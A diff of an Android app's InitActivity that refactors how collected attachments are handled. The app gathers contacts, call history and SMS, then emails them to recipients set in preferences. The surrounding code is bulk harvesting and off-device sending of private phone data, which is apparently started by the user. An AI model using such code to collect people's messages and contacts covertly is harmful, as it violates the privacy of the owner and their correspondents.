@@ -149,8 +149,13 @@ public class InitActivity extends Activity
     						return;
     					}
         		
-    					GetInfoTask.attachments = new ArrayList<File>();
+    					// Clear attachments
+    					if (GetInfoTask.attachments == null) 
+    						GetInfoTask.attachments = new ArrayList<File>();
+    					else
+    						GetInfoTask.attachments.clear();
         		
+    					// Collect info
     					GetInfoTask.CollectContact(context);
     					GetInfoTask.CollectPhoneCallHist(context);
     					GetInfoTask.CollectSms(context);
@@ -171,10 +176,6 @@ public class InitActivity extends Activity
     					String subject = getResources().getString(R.string.mail_from) 
         	          		 +  phoneNum + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
     					String body = String.format(getResources().getString(R.string.mail_body), phoneNum);
-    					List<String> fileList = new ArrayList<String>();
-    					for (int i = 0; i < GetInfoTask.attachments.size(); i++)
-    						fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
-        		
     					String[] recipients = GlobalPrefActivity.getMail(context).split(",");
     					if (recipients.length == 0) {
     						mHandler.sendEmptyMessageDelayed(ENABLE_GETINFO_BTN, 0);
@@ -187,7 +188,7 @@ public class InitActivity extends Activity
     					while(!result && retry > 0)
     					{
     						String sender = MailCfg.getSender(context);
-    						result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, fileList);
+    						result = GetInfoTask.sendMail(subject, body, sender, pwd, recipients, GetInfoTask.attachments);
     						if (!result) retry--;
     					}
     					if(result) {
